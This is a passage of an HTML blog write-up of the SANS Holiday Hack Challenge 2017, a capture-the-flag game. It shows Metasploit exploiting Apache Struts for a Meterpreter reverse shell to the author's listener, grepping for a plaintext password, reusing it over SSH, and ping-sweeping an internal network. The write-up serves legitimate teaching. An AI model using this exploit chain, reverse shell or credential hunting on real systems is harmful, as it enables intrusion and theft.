&lt;span class="go"&gt;   12 elf       20   0   18248   3336   2848 S   0.0  0.0   0:00.01 bash&lt;/span&gt;
&lt;span class="go"&gt;   18 elf       20   0   71468  26636   9420 S   0.0  0.2   0:00.50 kworker&lt;/span&gt;
&lt;span class="go"&gt;  210 elf       20   0   36672   3124   2660 R   0.0  0.0   0:00.00 top&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id25"&gt;Cranberry Pi: the &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;After solving the challenge, I checked &lt;a class="reference external" href="https://twitter.com/GlitteryElf"&gt;Sparkle Redberry's Twitter account&lt;/a&gt;.
In &lt;a class="reference external" href="https://twitter.com/GlitteryElf/status/938539753372237824"&gt;this tweet&lt;/a&gt;,
she mentions having problems with a malicious alias. Let's run &lt;code&gt;alias&lt;/code&gt;
on the box to see what's what:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@b21389dba617:~$&lt;/span&gt; &lt;span class="nb"&gt;alias&lt;/span&gt;
&lt;span class="go"&gt;alias alert=&amp;#39;notify-send --urgency=low -i &amp;quot;$([ $? = 0 ] &amp;amp;&amp;amp; echo terminal || echo error)&amp;quot; &amp;quot;$(history|tail -n1|sed -e &amp;#39;\&amp;#39;&amp;#39;s/^\s*[0-9]\+\s*//;s/[;&amp;amp;|]\s*alert$//&amp;#39;\&amp;#39;&amp;#39;)&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;alias egrep=&amp;#39;egrep --color=auto&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;alias fgrep=&amp;#39;fgrep --color=auto&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;alias grep=&amp;#39;grep --color=auto&amp;#39;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;alias kill=&amp;#39;true&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;alias killall=&amp;#39;true&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;alias l=&amp;#39;ls -CF&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;alias la=&amp;#39;ls -A&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;alias ll=&amp;#39;ls -alF&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;alias ls=&amp;#39;ls --color=auto&amp;#39;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;alias pkill=&amp;#39;true&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;alias skill=&amp;#39;true&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ah! There are aliases that prevent us from using &lt;code&gt;kill&lt;/code&gt; and the like,
which explains why our earlier &lt;code&gt;kill&lt;/code&gt; command didn't do anything. We
can redefine the aliases, or directly call the binaries.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@b21389dba617:~$&lt;/span&gt; which &lt;span class="nb"&gt;kill&lt;/span&gt;
&lt;span class="go"&gt;/bin/kill&lt;/span&gt;
&lt;span class="gp"&gt;elf@b21389dba617:~$&lt;/span&gt; ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep santaslittlehelperd
&lt;span class="go"&gt;elf          8  0.0  0.0   4224   624 pts/0    S    17:29   0:00 /usr/bin/santaslittlehelperd&lt;/span&gt;
&lt;span class="go"&gt;elf        139  0.0  0.0  11284  1024 pts/0    S+   17:31   0:00 grep --color=auto santaslittlehelperd&lt;/span&gt;
&lt;span class="gp"&gt;elf@b21389dba617:~$&lt;/span&gt; /bin/kill -9 &lt;span class="m"&gt;8&lt;/span&gt;
&lt;span class="gp"&gt;elf@b21389dba617:~$&lt;/span&gt; ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep santaslittlehelperd
&lt;span class="go"&gt;elf        148  0.0  0.0  11284   992 pts/0    S+   17:31   0:00 grep --color=auto santaslittlehelperd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id26"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Anyway, since we managed to kill the process, we're given a new object: the
Candy Cane, which can redirect the snowball.&lt;/p&gt;
&lt;img alt="winconceivable_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/winconceivable_terminal.png" /&gt;
&lt;p&gt;Now here's the layout I used to redirect the snowball:&lt;/p&gt;
&lt;img alt="winconceivable_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/winconceivable_snowball.gif" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-christmas-town-infrastructure-letters-to-santa-application"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id27"&gt;North Pole Christmas Town infrastructure: Letters to Santa application&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The North Pole fine folks host a web application, where all good boys and girls
can send a letter to Santa, requesting their favorite toys:&lt;/p&gt;
&lt;img alt="l2s_application.png" class="align-center" src="/images/sans-christmas-challenge-2017/l2s_application.png" /&gt;
&lt;p&gt;The question specifies that there is a page of &lt;em&gt;The Great Book&lt;/em&gt; at the web root
of the server. Let's see, the name of the first page was
&lt;code&gt;GreatBookPage1.pdf&lt;/code&gt;. Now, what could possibly be the name of this
second page... You guessed it, if you browse directly to the URL
&lt;a class="reference external" href="https://l2s.northpolechristmastown.com/GreatBookPage2.pdf"&gt;https://l2s.northpolechristmastown.com/GreatBookPage2.pdf&lt;/a&gt;, you get direct
access to the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage2.pdf"&gt;second page of The Great Book&lt;/a&gt; (sha256: &lt;code&gt;c4983d87ac8debc02a07d586ea9e43839ba081a426b5c490ceadb830c1cc3d4f&lt;/code&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On the Topic of Flying Animals&lt;/p&gt;
&lt;p&gt;Originally, only birds could fly in Oz. But, throughout the land, it was
universally recognized that other flying animals would bring great economic
benefits - faster transportation, decreased shipping costs, and a certain
whimsicality that would likely increase tourism. Oz's greatest scientific
minds were tasked with the creation of such beasts. Unfortunately, the
actual development of flying animal species was plagued with unforeseen
difficulties.&lt;/p&gt;
&lt;p&gt;The first attempt, a single flying lion name Moonracer, was deemed a
failure. Although the lion could indeed fly, children responded in abject
terror at his fearsome appearance. The Oz Chamber of Commerce demanded that
scientists choose a species less formidable than a lion.&lt;/p&gt;
&lt;p&gt;Hoping to correct their error, Ozian scientists next grafted wings onto
monkeys, hoping that inherent simian cutenes would prevail. Alas, winged
monkeys proved even more horrific than the flying lion.&lt;/p&gt;
&lt;p&gt;The exasperated scientists then made their third and final attempt - flying
reindeer. Through intense research, they devised an incredible
technological advancement, that would allow reindeer to fly without wings!
It was an unparalleled genetic and aerodynamic achievement.&lt;/p&gt;
&lt;p&gt;Yet, even this advance was accompanied by a slight concern. The
deep-seated genetic alterations introduced to support wingless flight
resulted in an infinitesimally small probability of a significant side
effect: a one-in-a-million chance that a reindeer would one day be born
with a brilliantly shiny red nose. Some of the scientists posited such a
reindeer's nose would even glow. Despite this change, the reserachers
charged ahead to breed an entire herd of such flying reindeer. And, for
centuries, the &amp;quot;red nose&amp;quot; phenomenon was never observed in the wild.&lt;/p&gt;
&lt;p&gt;Although the flying reindeer were a technological marvel and achieved
enormous success in Oz, The Great Schism changed everything. During the
separation negotiations, the Wizard of Oz and Santa Claus both decided that
Moonrancer and the reindeer would be moved to the North Pole, while the
flying monleys would remain in Oz.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Now let's try to pwn this application, in order to get access to the internal
network. If we take a look at the source code of the application, we find
something interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;


&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt; &lt;span class="na"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;X-UA-Compatible&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IE=edge&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;viewport&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;width=device-width, initial-scale=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Toys List&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/js/jquery.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/css/materialize.min.css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/js/materialize.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;North Pole Letters to Santa&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;North,Pole,Letters,Santa,toy,request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;author&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Alabaster Snowball&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
[...]
    &lt;span class="c"&gt;&amp;lt;!-- Development version --&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://dev.northpolechristmastown.com&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display: none;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Access Development Version&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There seems to be a hidden link, to a development version of the application:&lt;/p&gt;
&lt;img alt="dev_toy_index.png" class="align-center" src="/images/sans-christmas-challenge-2017/dev_toy_index.png" /&gt;
&lt;p&gt;Users can manually request toys:&lt;/p&gt;
&lt;img alt="dev_toy_request.png" class="align-center" src="/images/sans-christmas-challenge-2017/dev_toy_request.png" /&gt;
&lt;p&gt;Did you notice something interesting in the above screenshots? Let's take a
closer look:&lt;/p&gt;
&lt;img alt="dev_toy_struts.png" class="align-center" src="/images/sans-christmas-challenge-2017/dev_toy_struts.png" /&gt;
&lt;p&gt;This server is using Apache Struts as the application framework! Many of you
know that Struts was affected by a &lt;a class="reference external" href="https://cwiki.apache.org/confluence/display/WW/S2-052"&gt;pretty serious vulnerability&lt;/a&gt;
this year, which leads to unauthenticated remote code execution.&lt;/p&gt;
&lt;p&gt;Let's use our &lt;a class="reference external" href="https://github.com/rapid7/metasploit-framework"&gt;favorite exploitation framework&lt;/a&gt;
to get a shell on this webserver. I installed Metasploit on a public-facing
server of mine. SANS helpfully &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2"&gt;posted instructions&lt;/a&gt;
on how to register to the free-tier AWS offers if you don't already have a
public-facing server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;msf exploit(multi/http/struts2_rest_xstream) &amp;gt; options&lt;/span&gt;

&lt;span class="go"&gt;Module options (exploit/multi/http/struts2_rest_xstream):&lt;/span&gt;

&lt;span class="go"&gt;   Name       Current Setting                 Required  Description&lt;/span&gt;
&lt;span class="go"&gt;   ----       ---------------                 --------  -----------&lt;/span&gt;
&lt;span class="go"&gt;   Proxies                                    no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
&lt;span class="go"&gt;   RHOST      dev.northpolechristmastown.com  yes       The target address&lt;/span&gt;
&lt;span class="go"&gt;   RPORT      443                             yes       The target port (TCP)&lt;/span&gt;
&lt;span class="go"&gt;   SRVHOST    0.0.0.0                         yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0&lt;/span&gt;
&lt;span class="go"&gt;   SRVPORT    80                              yes       The local port to listen on.&lt;/span&gt;
&lt;span class="go"&gt;   SSL        true                            no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
&lt;span class="go"&gt;   SSLCert                                    no        Path to a custom SSL certificate (default is randomly generated)&lt;/span&gt;
&lt;span class="go"&gt;   TARGETURI  /orders/3043                    yes       Path to Struts action&lt;/span&gt;
&lt;span class="go"&gt;   URIPATH                                    no        The URI to use for this exploit (default is random)&lt;/span&gt;
&lt;span class="go"&gt;   VHOST                                      no        HTTP server virtual host&lt;/span&gt;


&lt;span class="go"&gt;Payload options (python/meterpreter/reverse_https):&lt;/span&gt;

&lt;span class="go"&gt;   Name   Current Setting        Required  Description&lt;/span&gt;
&lt;span class="go"&gt;   ----   ---------------        --------  -----------&lt;/span&gt;
&lt;span class="go"&gt;   LHOST  X.X.X.X                yes       The local listener hostname&lt;/span&gt;
&lt;span class="go"&gt;   LPORT  443                    yes       The local listener port&lt;/span&gt;
&lt;span class="go"&gt;   LURI                          no        The HTTP Path&lt;/span&gt;


&lt;span class="go"&gt;Exploit target:&lt;/span&gt;

&lt;span class="go"&gt;   Id  Name&lt;/span&gt;
&lt;span class="go"&gt;   --  ----&lt;/span&gt;
&lt;span class="go"&gt;   1   Python (In-Memory)&lt;/span&gt;


&lt;span class="go"&gt;msf exploit(multi/http/struts2_rest_xstream) &amp;gt; exploit&lt;/span&gt;

&lt;span class="go"&gt;[-] Handler failed to bind to 163.172.50.13:443&lt;/span&gt;
&lt;span class="go"&gt;[*] Started HTTPS reverse handler on https://0.0.0.0:443&lt;/span&gt;
&lt;span class="go"&gt;[*] https://X.X.X.X:443 handling request from X.X.X.X; (UUID: oqqwyeik) Staging python payload (43883 bytes) ...&lt;/span&gt;
&lt;span class="go"&gt;[*] Meterpreter session 1 opened (Y.Y.Y.Y:443 -&amp;gt; X.X.X.X:50354) at 2017-12-24 16:56:24 +0100&lt;/span&gt;

&lt;span class="go"&gt;meterpreter &amp;gt; getuid&lt;/span&gt;
&lt;span class="go"&gt;Server username: alabaster_snowball&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we have a Meterpreter shell on the server!&lt;/p&gt;
&lt;img alt="l2s_meterpreter.gif" class="align-center" src="/images/sans-christmas-challenge-2017/l2s_meterpreter.gif" /&gt;
&lt;p&gt;Let's take a look at &lt;code&gt;/var/www/html&lt;/code&gt;, which is the web root according to
the nginx configuration file found on the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;meterpreter &amp;gt; ls -l /var/www/html/*.pdf&lt;/span&gt;
&lt;span class="go"&gt;Listing: /var/www/html/*.pdf&lt;/span&gt;
&lt;span class="go"&gt;============================&lt;/span&gt;

&lt;span class="go"&gt;Mode              Size     Type  Last modified              Name&lt;/span&gt;
&lt;span class="go"&gt;----              ----     ----  -------------              ----&lt;/span&gt;
&lt;span class="go"&gt;100444/r--r--r--  1764298  fil   2017-12-05 18:27:15 +0100  GreatBookPage2.pdf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We see our second page, which we found earlier via forceful browsing. So even
if the name had not been predictable, we would have been able to find this
page.&lt;/p&gt;
&lt;p&gt;Now, the goal is to find Alabaster Snowball's password. I first tried to
escalate my privileges on the server, in order to get access to the
&lt;code&gt;/etc/shadow&lt;/code&gt; file, but I didn't succeed. So, let's find another way.&lt;/p&gt;
&lt;p&gt;Let's take a look at listening sockets:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;meterpreter &amp;gt; shell&lt;/span&gt;
&lt;span class="go"&gt;Process 20555 created.&lt;/span&gt;
&lt;span class="go"&gt;Channel 7 created.&lt;/span&gt;
&lt;span class="go"&gt;/bin/sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; netstat -tlpn
&lt;span class="go"&gt;(Not all processes could be identified, non-owned process info&lt;/span&gt;
&lt;span class="go"&gt; will not be shown, you would have to be root to see it all.)&lt;/span&gt;
&lt;span class="go"&gt;Active Internet connections (only servers)&lt;/span&gt;
&lt;span class="go"&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name&lt;/span&gt;
&lt;span class="go"&gt;tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -&lt;/span&gt;
&lt;span class="go"&gt;tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -&lt;/span&gt;
&lt;span class="go"&gt;tcp        6      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      11043/python&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      790/java&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;tcp6       0      0 :::22                   :::*                    LISTEN      -&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      790/java&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that our user is running a Java program, with the PID 790. Let's
get details on this process:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep -w &lt;span class="m"&gt;790&lt;/span&gt;
&lt;span class="go"&gt;alabast+   790  5.0  2.0 939444 630656 ?       Sl   03:01  43:43 /opt/jre/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dfile.encoding=UTF-8 -Dnet.sf.ehcache.skipUpdateCheck=true -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:MaxPermSize=128m -Xms512m -Xmx512m -Djava.endorsed.dirs=/opt/apache-tomcat/endorsed -classpath /opt/apache-tomcat/bin/bootstrap.jar -Dcatalina.base=/opt/apache-tomcat -Dcatalina.home=/opt/apache-tomcat -Djava.io.tmpdir=/opt/apache-tomcat/temp org.apache.catalina.startup.Bootstrap start&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Our user is running the Apache Tomcat server. The different Java resources
seem to be installed in &lt;code&gt;/opt&lt;/code&gt;. Let's take a look at the files there.
There may indeed be configuration files containing our current user's password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep -A &lt;span class="m"&gt;1&lt;/span&gt; -Rn alabaster_snowball /opt
&lt;span class="go"&gt;/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:3:            final String username = &amp;quot;alabaster_snowball&amp;quot;;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-4-            final String password = &amp;quot;stream_unhappy_buy_loss&amp;quot;;&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Bingo, we got a password for our user, but it seems to be for a MySQL
connection. Let's see if our user used the same password for their system
password. Our pwned server has an SSH server accessible from the Internet:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nmap -p &lt;span class="m"&gt;22&lt;/span&gt; dev.northpolechristmastown.com

&lt;span class="go"&gt;Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-24 18:40 CET&lt;/span&gt;
&lt;span class="go"&gt;Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.18s latency).&lt;/span&gt;
&lt;span class="go"&gt;rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com&lt;/span&gt;
&lt;span class="go"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp open  ssh&lt;/span&gt;

&lt;span class="go"&gt;Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ssh alabaster_snowball@dev.northpolechristmastown.com
&lt;span class="go"&gt;alabaster_snowball@dev.northpolechristmastown.com&amp;#39;s password: stream_unhappy_buy_loss&lt;/span&gt;
&lt;span class="gp"&gt;alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.FcLiqpWNISKoESUcwo5Jip8O$&lt;/span&gt; hostname
&lt;span class="go"&gt;hhc17-apache-struts1&lt;/span&gt;
&lt;span class="gp"&gt;alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.FcLiqpWNISKoESUcwo5Jip8O$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright! The password &lt;code&gt;stream_unhappy_buy_loss&lt;/code&gt; also works for the
system account. Let's the internal IP address of the system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ifconfig eth0
&lt;span class="go"&gt;eth0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1460&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;        inet 10.142.0.3  netmask 255.255.255.255  broadcast 10.142.0.3&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;        ether 42:01:0a:8e:00:03  txqueuelen 1000  (Ethernet)&lt;/span&gt;
&lt;span class="go"&gt;        RX packets 4837274  bytes 1254973259 (1.1 GiB)&lt;/span&gt;
&lt;span class="go"&gt;        RX errors 0  dropped 0  overruns 0  frame 4&lt;/span&gt;
&lt;span class="go"&gt;        TX packets 11266245  bytes 3876810300 (3.6 GiB)&lt;/span&gt;
&lt;span class="go"&gt;        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we have access to the 10.142.0.0/24 network, which is in scope! Let's
what IP addresses are up. For this I use a custom one-liner, launched directly
on the machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.142.0&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="sb"&gt;`&lt;/span&gt;seq &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;254&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; ping -c &lt;span class="m"&gt;1&lt;/span&gt; -W &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;$prefix&lt;/span&gt;.&lt;span class="nv"&gt;$i&lt;/span&gt; &amp;gt; /dev/null &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$prefix&lt;/span&gt;&lt;span class="s2"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="s2"&gt; is up&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.2 is up&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.3 is up&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.5 is up&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.6 is up&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.7 is up&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.8 is up&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.11 is up&lt;/span&gt;
&lt;span class="go"&gt;10.142.0.13 is up&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that we know which IPs are up, let's perform a port scan. Luckily,
&lt;code&gt;nmap&lt;/code&gt; is installed on the server, so we can use it. But let's say that
